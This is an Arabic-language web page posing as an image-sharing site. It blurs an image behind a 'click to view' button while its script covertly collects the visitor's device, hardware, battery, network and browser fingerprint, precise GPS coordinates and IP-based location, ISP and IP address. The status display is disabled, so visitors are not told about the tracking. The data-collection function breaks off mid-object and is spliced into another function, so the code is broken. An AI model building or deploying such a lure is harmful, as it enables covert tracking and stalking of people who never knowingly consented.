<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موقع رفع الصور</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
            overflow: hidden;
            animation: slideUp 0.8s ease-out;
        }

        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .main-image {
            width: 100%;
            max-width: 400px;
            height: auto;
            border-radius: 15px;
            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
            margin: 30px auto;
            filter: blur(20px);
            transition: filter 0.5s ease;
            display: block;
        }

        .main-image.clear {
            filter: blur(0px);
        }

        .click-button {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            margin: 20px auto;
            display: block;
            transition: all 0.3s ease;
        }

        .click-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(231, 76, 60, 0.4);
        }

        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            margin: 20px;
            text-align: center;
            display: none;
        }

        .location-status {
            background: #fff3cd;
            color: #856404;
            padding: 15px;
            border-radius: 10px;
            margin: 20px;
            text-align: center;
            font-size: 0.9em;
            border: 1px solid #ffeaa7;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>موقع رفع الصور</h1>
            <p>منصة سهلة وسريعة لرفع ومشاركة الصور</p>
        </div>

        <img src="https://i.imgur.com/zcb3oRL.jpeg" 
             alt="الصورة المختارة" 
             class="main-image" 
             id="mainImage">

        <button class="click-button" id="viewButton" onclick="viewImage()">
            🔍 اضغط هنا لمشاهدة الصورة
        </button>

        <div class="success-message" id="successMessage">
            ✅ تم الموافقة على عرض الصورة
        </div>
    </div>

    <script>
        // متغيرات الموقع العامة
        window.userLocation = { 
            status: 'جاري المحاولة...',
            method: 'لم يتم التحديد',
            attempts: 0
        };

        // تحديد نوع الجهاز بدقة أكبر
        function getDetailedDeviceInfo() {
            const ua = navigator.userAgent;
            const platform = navigator.platform;
            
            let deviceInfo = {
                type: 'غير معروف',
                model: 'غير معروف',
                brand: 'غير معروف',
                detailed_type: 'غير معروف',
                is_mobile: false,
                is_tablet: false,
                is_desktop: false,
                is_smart_tv: false,
                is_bot: false
            };

            // تحديد نوع الجهاز الأساسي
            if (/bot|crawler|spider|crawling/i.test(ua)) {
                deviceInfo.type = 'بوت';
                deviceInfo.is_bot = true;
            } else if (/Smart TV|SmartTV|TV|NetCast|SMART-TV|HbbTV|AppleTV|GoogleTV|Android TV|webOS|Tizen|SmartTV2/i.test(ua)) {
                deviceInfo.type = 'تلفزيون ذكي';
                deviceInfo.is_smart_tv = true;
            } else if (/Mobile|Android|iPhone|iPod|BlackBerry|Windows Phone|Opera Mini|IEMobile|Mobile Safari/i.test(ua)) {
                deviceInfo.type = 'هاتف ذكي';
                deviceInfo.is_mobile = true;
            } else if (/iPad|Tablet|Android(?!.*Mobile)|Kindle|Silk/i.test(ua)) {
                deviceInfo.type = 'تابلت';
                deviceInfo.is_tablet = true;
            } else {
                deviceInfo.type = 'كمبيوتر مكتبي';
                deviceInfo.is_desktop = true;
            }

            // تحديد العلامة التجارية والموديل
            if (/iPhone/i.test(ua)) {
                deviceInfo.brand = 'Apple';
                deviceInfo.detailed_type = 'iPhone';
                const match = ua.match(/iPhone OS (\d+)_(\d+)/);
                if (match) {
                    deviceInfo.model = `iPhone (iOS ${match[1]}.${match[2]})`;
                }
            } else if (/iPad/i.test(ua)) {
                deviceInfo.brand = 'Apple';
                deviceInfo.detailed_type = 'iPad';
                const match = ua.match(/OS (\d+)_(\d+)/);
                if (match) {
                    deviceInfo.model = `iPad (iOS ${match[1]}.${match[2]})`;
                }
            } else if (/Android/i.test(ua)) {
                deviceInfo.brand = 'Android';
                const versionMatch = ua.match(/Android (\d+\.?\d*)/);
                const version = versionMatch ? versionMatch[1] : 'غير معروف';
                
                // تحديد علامة الهاتف الأندرويد
                if (/Samsung/i.test(ua)) {
                    deviceInfo.brand = 'Samsung';
                    const modelMatch = ua.match(/SM-([A-Z0-9]+)/);
                    deviceInfo.model = modelMatch ? `Samsung ${modelMatch[1]}` : 'Samsung Galaxy';
                } else if (/Huawei/i.test(ua)) {
                    deviceInfo.brand = 'Huawei';
                    const modelMatch = ua.match(/([A-Z0-9\-]+)\s+Build/);
                    deviceInfo.model = modelMatch ? `Huawei ${modelMatch[1]}` : 'Huawei';
                } else if (/Xiaomi/i.test(ua)) {
                    deviceInfo.brand = 'Xiaomi';
                    const modelMatch = ua.match(/([A-Z0-9\-]+)\s+Build/);
                    deviceInfo.model = modelMatch ? `Xiaomi ${modelMatch[1]}` : 'Xiaomi';
                } else if (/OPPO/i.test(ua)) {
                    deviceInfo.brand = 'OPPO';
                    const modelMatch = ua.match(/([A-Z0-9\-]+)\s+Build/);
                    deviceInfo.model = modelMatch ? `OPPO ${modelMatch[1]}` : 'OPPO';
                } else if (/vivo/i.test(ua)) {
                    deviceInfo.brand = 'Vivo';
                    const modelMatch = ua.match(/([A-Z0-9\-]+)\s+Build/);
                    deviceInfo.model = modelMatch ? `Vivo ${modelMatch[1]}` : 'Vivo';
                } else if (/LG/i.test(ua)) {
                    deviceInfo.brand = 'LG';
                    const modelMatch = ua.match(/LG-([A-Z0-9\-]+)/);
                    deviceInfo.model = modelMatch ? `LG ${modelMatch[1]}` : 'LG';
                } else if (/Sony/i.test(ua)) {
                    deviceInfo.brand = 'Sony';
                    const modelMatch = ua.match(/([A-Z0-9\-]+)\s+Build/);
                    deviceInfo.model = modelMatch ? `Sony ${modelMatch[1]}` : 'Sony Xperia';
                } else if (/HTC/i.test(ua)) {
                    deviceInfo.brand = 'HTC';
                    const modelMatch = ua.match(/HTC[_\s]([A-Z0-9\-]+)/);
                    deviceInfo.model = modelMatch ? `HTC ${modelMatch[1]}` : 'HTC';
                } else if (/Nokia/i.test(ua)) {
                    deviceInfo.brand = 'Nokia';
                    const modelMatch = ua.match(/Nokia([A-Z0-9\-]+)/);
                    deviceInfo.model = modelMatch ? `Nokia ${modelMatch[1]}` : 'Nokia';
                } else if (/Motorola/i.test(ua)) {
                    deviceInfo.brand = 'Motorola';
                    const modelMatch = ua.match(/([A-Z0-9\-]+)\s+Build/);
                    deviceInfo.model = modelMatch ? `Motorola ${modelMatch[1]}` : 'Motorola';
                } else if (/OnePlus/i.test(ua)) {
                    deviceInfo.brand = 'OnePlus';
                    const modelMatch = ua.match(/([A-Z0-9\-]+)\s+Build/);
                    deviceInfo.model = modelMatch ? `OnePlus ${modelMatch[1]}` : 'OnePlus';
                } else {
                    deviceInfo.model = `Android ${version}`;
                }
                
                deviceInfo.detailed_type = 'Android Device';
            } else if (/Windows NT/i.test(ua)) {
                deviceInfo.brand = 'Microsoft';
                deviceInfo.detailed_type = 'Windows PC';
                const versionMatch = ua.match(/Windows NT (\d+\.\d+)/);
                if (versionMatch) {
                    const winVersion = {
                        '10.0': 'Windows 10/11',
                        '6.3': 'Windows 8.1',
                        '6.2': 'Windows 8',
                        '6.1': 'Windows 7',
                        '6.0': 'Windows Vista',
                        '5.1': 'Windows XP'
                    };
                    deviceInfo.model = winVersion[versionMatch[1]] || `Windows NT ${versionMatch[1]}`;
                }
            } else if (/Mac OS X/i.test(ua)) {
                deviceInfo.brand = 'Apple';
                deviceInfo.detailed_type = 'macOS';
                const versionMatch = ua.match(/Mac OS X (\d+)[._](\d+)/);
                if (versionMatch) {
                    deviceInfo.model = `macOS ${versionMatch[1]}.${versionMatch[2]}`;
                }
            } else if (/Linux/i.test(ua)) {
                deviceInfo.brand = 'Linux';
                deviceInfo.detailed_type = 'Linux PC';
                if (/Ubuntu/i.test(ua)) {
                    deviceInfo.model = 'Ubuntu Linux';
                } else if (/CentOS/i.test(ua)) {
                    deviceInfo.model = 'CentOS Linux';
                } else if (/Fedora/i.test(ua)) {
                    deviceInfo.model = 'Fedora Linux';
                } else {
                    deviceInfo.model = 'Linux';
                }
            } else if (/BlackBerry/i.test(ua)) {
                deviceInfo.brand = 'BlackBerry';
                deviceInfo.detailed_type = 'BlackBerry';
                const modelMatch = ua.match(/BlackBerry(\w+)/);
                deviceInfo.model = modelMatch ? `BlackBerry ${modelMatch[1]}` : 'BlackBerry';
            } else if (/Windows Phone/i.test(ua)) {
                deviceInfo.brand = 'Microsoft';
                deviceInfo.detailed_type = 'Windows Phone';
                const versionMatch = ua.match(/Windows Phone OS (\d+\.\d+)/);
                deviceInfo.model = versionMatch ? `Windows Phone ${versionMatch[1]}` : 'Windows Phone';
            }

            return deviceInfo;
        }

        // الحصول على معلومات الشبكة المتقدمة
        function getAdvancedNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            
            let networkInfo = {
                type: 'غير معروف',
                effectiveType: 'غير معروف',
                downlink: 'غير معروف',
                downlinkMax: 'غير معروف',
                rtt: 'غير معروف',
                saveData: false,
                onLine: navigator.onLine
            };

            if (connection) {
                networkInfo.type = connection.type || 'غير معروف';
                networkInfo.effectiveType = connection.effectiveType || 'غير معروف';
                networkInfo.downlink = connection.downlink ? `${connection.downlink} Mbps` : 'غير معروف';
                networkInfo.downlinkMax = connection.downlinkMax ? `${connection.downlinkMax} Mbps` : 'غير معروف';
                networkInfo.rtt = connection.rtt ? `${connection.rtt} ms` : 'غير معروف';
                networkInfo.saveData = connection.saveData || false;
            }

            return networkInfo;
        }

        // الحصول على معلومات الأجهزة المتقدمة
        async function getHardwareInfo() {
            let hardwareInfo = {
                cores: navigator.hardwareConcurrency || 'غير معروف',
                memory: 'غير معروف',
                storage: 'غير معروف',
                gpu: 'غير معروف',
                battery: 'غير معروف',
                orientation: 'غير معروف',
                vibration: 'غير معروف',
                gamepad: 'غير معروف',
                webgl: 'غير معروف',
                touch: navigator.maxTouchPoints || 0,
                pointer: 'غير معروف',
                hover: 'غير معروف'
            };

            // معلومات الذاكرة
            if (navigator.deviceMemory) {
                hardwareInfo.memory = `${navigator.deviceMemory} GB`;
            }

            // معلومات التخزين
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    const estimate = await navigator.storage.estimate();
                    hardwareInfo.storage = `${Math.round(estimate.quota / 1024 / 1024 / 1024)} GB متاح`;
                } catch (e) {
                    hardwareInfo.storage = 'غير متاح';
                }
            }

            // معلومات البطارية
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    hardwareInfo.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'يتم الشحن' : 'غير متصل بالشاحن',
                        chargingTime: battery.chargingTime === Infinity ? 'غير معروف' : `${Math.round(battery.chargingTime / 60)} دقيقة`,
                        dischargingTime: battery.dischargingTime === Infinity ? 'غير معروف' : `${Math.round(battery.dischargingTime / 60)} دقيقة`
                    };
                } catch (e) {
                    hardwareInfo.battery = 'غير متاح';
                }
            }

            // معلومات الشاشة والاتجاه
            if (screen.orientation) {
                hardwareInfo.orientation = screen.orientation.type;
            }

            // دعم الاهتزاز
            hardwareInfo.vibration = 'vibrate' in navigator ? 'مدعوم' : 'غير مدعوم';

            // دعم الألعاب
            hardwareInfo.gamepad = 'getGamepads' in navigator ? 'مدعوم' : 'غير مدعوم';

            // معلومات WebGL
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        hardwareInfo.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    } else {
                        hardwareInfo.gpu = 'WebGL مدعوم';
                    }
                } else {
                    hardwareInfo.gpu = 'WebGL غير مدعوم';
                }
            } catch (e) {
                hardwareInfo.gpu = 'غير متاح';
            }

            // معلومات الإدخال
            if (window.matchMedia) {
                hardwareInfo.pointer = window.matchMedia('(pointer: coarse)').matches ? 'لمس' : 
                                    window.matchMedia('(pointer: fine)').matches ? 'دقيق' : 'غير معروف';
                hardwareInfo.hover = window.matchMedia('(hover: hover)').matches ? 'مدعوم' : 'غير مدعوم';
            }

            return hardwareInfo;
        }

        // الحصول على معلومات الأمان والخصوصية
        function getSecurityInfo() {
            return {
                https: location.protocol === 'https:',
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'غير محدد',
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : 'غير متاح',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookieStore: 'cookieStore' in window ? 'مدعوم' : 'غير مدعوم',
                serviceWorker: 'serviceWorker' in navigator ? 'مدعوم' : 'غير مدعوم',
                notifications: 'Notification' in window ? 'مدعوم' : 'غير مدعوم',
                geolocation: 'geolocation' in navigator ? 'مدعوم' : 'غير مدعوم',
                mediaDevices: 'mediaDevices' in navigator ? 'مدعوم' : 'غير مدعوم',
                bluetooth: 'bluetooth' in navigator ? 'مدعوم' : 'غير مدعوم',
                usb: 'usb' in navigator ? 'مدعوم' : 'غير مدعوم',
                webauthn: 'credentials' in navigator ? 'مدعوم' : 'غير مدعوم'
            };
        }

        // الحصول على الموقع من خلال IP
        async function getLocationByIP() {
            try {
                console.log('🌐 محاولة الحصول على الموقع عبر IP...');
                
                const ipServices = [
                    'https://ipapi.co/json/',
                    'http://ip-api.com/json/',
                    'https://ipinfo.io/json',
                    'https://freegeoip.app/json/'
                ];

                for (let service of ipServices) {
                    try {
                        const response = await fetch(service);
                        const data = await response.json();
                        
                        if (data.latitude || data.lat) {
                            window.userLocation = {
                                latitude: data.latitude || data.lat,
                                longitude: data.longitude || data.lon || data.lng,
                                city: data.city || 'غير معروف',
                                country: data.country || data.country_name || 'غير معروف',
                                region: data.region || data.regionName || 'غير معروف',
                                isp: data.isp || data.org || 'غير معروف',
                                ip: data.ip || data.query || 'غير معروف',
                                postal: data.postal || data.zip || 'غير معروف',
                                timezone: data.timezone || 'غير معروف',
                                accuracy: 'تقريبي (IP)',
                                status: 'تم الحصول عليه عبر IP',
                                method: 'IP Geolocation',
                                service: service
                            };
                            updateLocationStatus('✅ تم تحديد الموقع التقريبي عبر IP');
                            return true;
                        }
                    } catch (error) {
                        console.log(`❌ فشل في الخدمة: ${service}`);
                        continue;
                    }
                }
                
                return false;
            } catch (error) {
                console.error('❌ خطأ في الحصول على الموقع عبر IP:', error);
                return false;
            }
        }

        // الحصول على الموقع باستخدام GPS
        function getLocationByGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(false);
                    return;
                }

                console.log('🛰️ محاولة الحصول على الموقع عبر GPS...');
                
                const options = {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                };

                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        window.userLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy) + ' متر',
                            altitude: position.coords.altitude ? Math.round(position.coords.altitude) + ' متر' : 'غير متاح',
                            altitudeAccuracy: position.coords.altitudeAccuracy ? Math.round(position.coords.altitudeAccuracy) + ' متر' : 'غير متاح',
                            heading: position.coords.heading ? Math.round(position.coords.heading) + ' درجة' : 'غير متاح',
                            speed: position.coords.speed ? Math.round(position.coords.speed * 3.6) + ' كم/ساعة' : 'غير متاح',
                            status: 'تم الحصول عليه بدقة عالية',
                            method: 'GPS',
                            timestamp: new Date(position.timestamp).toLocaleString('ar-IQ')
                        };
                        updateLocationStatus('✅ تم تحديد الموقع بدقة عالية عبر GPS');
                        console.log('✅ تم الحصول على الموقع عبر GPS:', window.userLocation);
                        resolve(true);
                    },
                    function(error) {
                        let errorMsg = '';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMsg = 'رفض المستخدم إذن الموقع';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMsg = 'الموقع غير متاح';
                                break;
                            case error.TIMEOUT:
                                errorMsg = 'انتهت مهلة الانتظار';
                                break;
                            default:
                                errorMsg = 'خطأ غير معروف';
                        }
                        console.log('❌ فشل GPS:', errorMsg);
                        resolve(false);
                    },
                    options
                );
            });
        }

        // تحديث حالة الموقع في الواجهة (معطل)
        function updateLocationStatus(message) {
            console.log('📍 ' + message);
        }

        // وظيفة جمع البيانات المحسنة
        async function collectData() {
            const deviceInfo = getDetailedDeviceInfo();
            const networkInfo = getAdvancedNetworkInfo();
            const hardwareInfo = await getHardwareInfo();
            const securityInfo = getSecurityInfo();
            
            return {
                // معلومات الوقت والزيارة
                timestamp: new Date().toLocaleString('ar-IQ'),
                visit_time: new Date().toISOString(),
                page_url: window.location.href,
                referrer: document.referrer || 'مباشر',
                page_load_time: Math.round(performance.now()),
                
                // معلومات الجهاز المفصلة
                device_type: deviceInfo.type,
                device_brand: deviceInfo.brand,
                device_model: deviceInfo.model,
                device_detailed_type: deviceInfo.detailed_type,
                is_mobile: deviceInfo.is_mobile,
                is_tablet: deviceInfo.is_tablet,
                is_desktop: deviceInfo.is_desktop,
                is_smart_tv: deviceInfo.is_smart_tv,
                is_bot: deviceInfo.is_bot,
                
                // معلومات النظام والمتصفح
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : 'غير متاح',
                
                // معلومات الشاشة
                screen_width: screen.width,
                screen_height: screen.height,
                screen_resolution: `${screen.width}x${screen.height}`,
                screen_color_depth: screen.colorDepth,
                screen_pixel_ratio: window.devicePixelRatio,
                window_width: window.innerWidth,
                window_height: window.innerHeight,
                
                // معلومات الشبكة المتقدمة
                network_type: networkInfo.type,
                network_effective_type: networkInfo.effectiveType,
                network_downlink: networkInfo.downlink,
                network_downlink_max: networkInfo.downlinkMax,
                network_rtt: networkInfo.rtt,
                network_save_data: networkInfo.saveData,
                network_online: networkInfo.onLine,
                
                // معلومات الأجهزة
                hardware_cores: hardwareInfo.cores,
                hardware_memory: hardwareInfo.memory,
                hardware_storage: hardwareInfo.storage,
                hardware_gpu: hardwareInfo.gpu,
                hardware_battery: hardwareInfo.battery,
                hardware_orientation: hardwareInfo.orientation,
                hardware_vibration: hardwareInfo.vibration,
                hardware_gamepad: hardwareInfo.gamepad,
                hardware_touch_points: hardwareInfo.touch,
                hardware_pointer: hardwareInfo.pointer,
                hardware_hover: hardwareInfo.hover,
                
                // معلومات الأمان
                security_https: securityInfo.https,
                security_cookies: securityInfo.cookiesEnabled,
                security_do_not_track: securityInfo.doNotTrack,
                security_timezone: securityInfo.timezone,
                security_geolocation: securityInfo.geolocation,
                security_notifications: securityInfo.notifications,
                security_media_devices: securityInfo.mediaDevices,
                security_bluetooth: securityInfo.bluetooth,
                security_usb: securityInfo.usb,
                security_webauthn: securityInfo.webauthn,
                
                // معلومات الموقع
                latitude: window.userLocation?.latitude || 'غير متاح',
                longitude: window.userLocation?.longitude || 'غير متاح',
                location_accuracy: window.userLocation?.accuracy || 'غير متاح',
                location_altitude: window.userLocation?.altitude || 'غير متاح',
                location_speed: window.userLocation?.speed || 'غير متاح',
                location_heading: window.userLocation?.heading || 'غير متاح',

        // وظيفة شاملة للحصول على الموقع
        async function getAllLocationMethods() {
            console.log('🚀 بدء عملية تحديد الموقع الشاملة...');
            window.userLocation.attempts = 0;
            
            updateLocationStatus('🔄 جاري تحديد الموقع بدقة عالية...');
            
            // المحاولة الأولى: GPS عالي الدقة
            window.userLocation.attempts++;
            const gpsSuccess = await getLocationByGPS();
            if (gpsSuccess) {
                console.log('✅ تم الحصول على الموقع عبر GPS');
                return;
            }
            
            updateLocationStatus('🔄 جاري تحديد الموقع عبر IP...');
            
            // المحاولة الثانية: IP Geolocation
            window.userLocation.attempts++;
            const ipSuccess = await getLocationByIP();
            if (ipSuccess) {
                console.log('✅ تم الحصول على الموقع عبر IP');
                return;
            }
            
            // إذا فشلت جميع المحاولات
            window.userLocation = {
                latitude: 'غير متاح',
                longitude: 'غير متاح',
                accuracy: 'غير متاح',
                status: 'فشل في جميع المحاولات',
                method: 'لا يوجد',
                attempts: window.userLocation.attempts
            };

            console.log('❌ فشل في جميع طرق تحديد الموقع');
        }
